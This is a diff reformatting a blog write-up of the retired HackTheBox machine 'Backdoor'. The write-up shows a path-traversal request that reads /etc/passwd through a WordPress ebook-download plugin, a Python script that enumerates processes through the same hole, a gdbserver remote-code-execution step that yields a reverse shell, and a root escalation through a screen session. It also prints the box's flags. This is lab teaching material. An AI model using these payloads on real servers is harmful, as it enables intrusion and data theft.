@@ -1,169 +1,123 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Backdoor publish on November 20, 2021 by hkabubaker17. This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a gdbserver and a screen process." />
-<meta name="keywords" content="security, boot2root, HTB, wordpress, lfi, gdbserver, screen">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Backdoor"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Backdoor publish on November 20, 2021 by hkabubaker17. This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a gdbserver and a screen process."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2022/04/htb-backdoor.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2022-04-25 15:40:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="wordpress"/>
-  <meta property="article:tag" content="lfi"/>
-  <meta property="article:tag" content="gdbserver"/>
-  <meta property="article:tag" content="screen"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Backdoor</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Backdoor publish on November 20, 2021 by hkabubaker17. This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a gdbserver and a screen process." name="description"/>
+<meta content="security, boot2root, HTB, wordpress, lfi, gdbserver, screen" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Backdoor" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Backdoor publish on November 20, 2021 by hkabubaker17. This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a gdbserver and a screen process." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2022/04/htb-backdoor.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2022-04-25 15:40:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="wordpress" property="article:tag"/>
+<meta content="lfi" property="article:tag"/>
+<meta content="gdbserver" property="article:tag"/>
+<meta content="screen" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Backdoor</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-backdoor">HTB: Backdoor</h1>
-    <p>
+<header>
+<h1 id="htb-backdoor">HTB: Backdoor</h1>
+<p>
       Posted on 25 Apr 2022 in <a href="../../category/security.html">security</a>
 
-        &#8226; 2 min read
+        • 2 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2022.04/backdoor_card.png" alt="Backdoor" width="262"></p>
+</header>
+<div>
+<p><img alt="Backdoor" class="align-left" src="/media/2022.04/backdoor_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/416">Backdoor</a> publish on
 November 20, 2021 by
 <a href="https://www.hackthebox.com/home/users/profile/79623">hkabubaker17</a>.
 This box is rated as an easy machine. It implies a wordpress plugin, a LFI, a
 gdbserver and a screen process.</p>
-
-
 <h1>Foothold</h1>
 <h2>Recon</h2>
 <p>Let us start as always by a <code>nmap</code> scan. Only three TCP ports are open: 22 (SSH), 80 (HTTP) and 1337 (we don't know what
@@ -181,11 +135,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Jan  4 08:46:11 2022 -- 1 IP address (1 host up) scanned in 31.95 seconds
 </code></pre></div>
-
 <p>The HTTP port is a basic WordPress website.</p>
-<p><img alt="WordPress homepage" src="/media/2022.04/backdoor_01.png"></p>
+<p><img alt="WordPress homepage" class="image-process-article-image" src="/media/2022.04/derivatives/article-image/backdoor_01.png"/></p>
 <p>Looking at the installed plugin we found that ebook-download is available:</p>
-<p><img alt="ebook-download plugin" src="/media/2022.04/backdoor_02.png"></p>
+<p><img alt="ebook-download plugin" class="image-process-article-image" src="/media/2022.04/derivatives/article-image/backdoor_02.png"/></p>
 <p>This WordPress plugin is <a href="https://www.exploit-db.com/exploits/39574">vulnerable to a LFI</a>
 that we can exploit to retrieve files on the box.</p>
 <div class="highlight"><pre><span></span><code>└─$ curl http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../etc/passwd
@@ -197,33 +150,30 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
 &lt;script&gt;window.close()&lt;/script&gt;
 </code></pre></div>
-
 <p>We want to find which process is running on port 1337. We write a quick python
 script that get the Max PID and list the process by PID.</p>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="n">i</span><span class="o">=</span><span class="mi">0</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/sys/kernel/pid_max&#39;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/sys/kernel/pid_max'</span><span class="p">)</span>
 <span class="n">maxpid</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">132</span><span class="p">:</span><span class="o">-</span><span class="mi">31</span><span class="p">])</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">maxpid</span><span class="p">)</span>
 
 <span class="k">while</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">maxpid</span><span class="p">:</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;/cmdline&#39;</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">102</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span><span class="mi">112</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))]</span><span class="o">!=</span><span class="s1">&#39;&lt;script&gt;wi&#39;</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">'/cmdline'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">102</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span><span class="mi">112</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))]</span><span class="o">!=</span><span class="s1">'&lt;script&gt;wi'</span><span class="p">:</span>
         <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="mi">102</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span><span class="o">-</span><span class="mi">31</span><span class="p">])</span>
     <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
 </code></pre></div>
-
 <p>We finally discover that the 1337 process is a <code>gdbserver</code>. We also notice a
 <code>sceen</code> session running as <code>root</code>.</p>
 <div class="highlight"><pre><span></span><code>└─$ python3 l.py
 4194304
 /sbin/initautoautomatic-ubiquitynoprompt
 &lt;SNIP&gt;
-/bin/sh-cwhile true;do su user -c &quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&quot;; done
+/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
 </code></pre></div>
-
 <p><code>gdbserver</code> is vulnerable to a <a href="https://www.exploit-db.com/exploits/50539">RCE</a>.
 We generate the reverse shell, start a listener and launch the exploit. Getting
 a shell as <code>user</code> allowing use to grab the user flag.</p>
@@ -240,7 +190,6 @@ uid=1000(user) gid=1000(user) groups=1000(user)
 cat user.txt
 ee34dbf05622446ad1e9f1d35ac6d43e
 </code></pre></div>
-
 <h1>Root</h1>
 <p>We create the <code>.ssh</code> directory and put our public SSH key in the
 <code>authorized_keys</code> file in order to be more comfortable.</p>
@@ -252,7 +201,6 @@ There is a suitable screen on:
         3694.root       (01/05/2022 09:38:33 AM)        (Multi, detached)
 1 Socket in /run/screen/S-root.
 </code></pre></div>
-
 <p>And we attach it getting the root flag:</p>
 <div class="highlight"><pre><span></span><code>user@Backdoor:~$ screen -x root/root
 
@@ -261,67 +209,45 @@ uid=0(root) gid=0(root) groups=0(root)
 root@Backdoor:~# cat root.txt
 dbb5f80464c7d1489b8bba15d280195e
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>A quick an easy box, perfect for me as it has been a while since my last box.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/wordpress.html">wordpress</a>
-      <a href="../../tag/lfi.html">lfi</a>
-      <a href="../../tag/gdbserver.html">gdbserver</a>
-      <a href="../../tag/screen.html">screen</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2022/03/htb-secret.html" title="HTB: Secret">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2022/05/htb-pandora.html" title="HTB: Pandora">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/wordpress.html">wordpress</a>
+<a href="../../tag/lfi.html">lfi</a>
+<a href="../../tag/gdbserver.html">gdbserver</a>
+<a href="../../tag/screen.html">screen</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2022/03/htb-secret.html" title="HTB: Secret">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2022/05/htb-pandora.html" title="HTB: Pandora">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -332,6 +258,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
